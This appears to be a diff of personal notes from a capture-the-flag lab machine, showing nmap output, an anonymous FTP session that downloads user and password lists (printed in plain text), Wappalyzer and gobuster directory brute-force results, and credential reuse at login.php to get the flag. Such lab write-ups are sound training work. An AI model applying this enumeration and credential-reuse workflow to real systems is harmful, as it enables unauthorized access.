@@ -1,3 +1,137 @@
-IP = 10.129.217.23
+IP = 10.129.173.191
 
 PHP, FTP related
+
+#Nmap Enumeration Report
+---------------------------
+Nmap scan report for 10.129.173.191
+Host is up (0.051s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.16.168
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Unix
+
+
+Highlight: ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+
+FTP analysis
+-------------------------
+ftp 10.129.173.191         
+    Connected to 10.129.173.191.
+    220 (vsFTPd 3.0.3)
+Name (10.129.173.191:kali): anonymous  
+    230 Login successful.
+    Remote system type is UNIX.
+    Using binary mode to transfer files.
+ftp> dir
+    229 Entering Extended Passive Mode (|||43577|)
+    150 Here comes the directory listing.
+    -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+    -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+    226 Directory send OK.
+    ftp> get allowed.userlist
+    local: allowed.userlist remote: allowed.userlist
+    229 Entering Extended Passive Mode (|||41642|)
+    150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+    100% |*************************************************|    33        0.63 KiB/s    00:00 ETA
+    226 Transfer complete.
+    33 bytes received in 00:00 (0.14 KiB/s)
+    ftp> get allowed.userlist.passwd
+    local: allowed.userlist.passwd remote: allowed.userlist.passwd
+    229 Entering Extended Passive Mode (|||48948|)
+    150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+    100% |*************************************************|    62        1.35 KiB/s    00:00 ETA
+    226 Transfer complete.
+62 bytes received in 00:00 (0.23 KiB/s)
+ftp> exit
+    221 Goodbye.
+
+cat allowed.userlist   
+    aron
+    pwnmeow
+    egotisticalsw
+    admin
+
+cat allowed.userlist.passwd
+    root    
+    Supersecretpassword1
+    @BaASD&9032123sADS
+    rKXM59ESxesUFHAd
+
+Wappalyzer analysis (plugin)
+-----------------------------
+Miscellaneous
+    Popper
+Web servers
+    Apache 2.4.41
+Programming languages
+    PHP
+Operating systems
+    Ubuntu
+CDN
+    Google Hosted Libraries
+JavaScript libraries
+    jQuery 1.12.4
+    Modernizr
+    Slick
+    Isotope
+UI frameworks
+    Bootstrap 4.3.1
+    Tailwind CSS 75% sure
+
+Gobuster analysis
+--------------------
+gobuster dir  --url http://10.129.173.191/ --wordlist directory-list-2.3-small.txt -x php,html
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.173.191/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html
+[+] Timeout:                 10s
+===============================================================
+2022/04/09 11:08:30 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 58565]
+/login.php            (Status: 200) [Size: 1577] 
+/assets               (Status: 301) [Size: 317] [--> http://10.129.173.191/assets/]
+/css                  (Status: 301) [Size: 314] [--> http://10.129.173.191/css/]   
+/js                   (Status: 301) [Size: 313] [--> http://10.129.173.191/js/]    
+/logout.php           (Status: 302) [Size: 0] [--> login.php]                      
+/config.php           (Status: 200) [Size: 0]                                      
+/fonts                (Status: 301) [Size: 316] [--> http://10.129.173.191/fonts/] 
+/dashboard            (Status: 301) [Size: 320] [--> http://10.129.173.191/dashboard/]
+Progress: 19713 / 262995 (7.50%)        
+[!] Keyboard interrupt detected, terminating.
+                                                                                      
+===============================================================
+2022/04/09 11:11:40 Finished
+===============================================================
+
+login.php - FTP credentials Used
+Flag retrieved
